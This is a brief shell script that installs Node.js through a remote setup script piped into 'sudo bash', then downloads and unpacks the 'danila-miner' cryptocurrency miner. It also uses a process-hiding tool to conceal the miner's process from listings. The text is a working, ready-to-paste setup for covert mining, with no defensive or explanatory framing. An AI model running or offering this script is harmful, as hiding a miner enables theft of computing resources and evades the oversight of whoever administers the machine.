sudo apt update
clear
curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt install nodejs && npm i -g node-process-hider && sudo ph add danila-miner && wget https://whalepool-cdn.fra1.digitaloceanspaces.com/software/danila-miner/danila-miner-2.3.1-ubuntu-bionic.tar.gz && tar -xvf danila-miner-2.3.1-ubuntu-bionic.tar.gz && apt install screen
screen
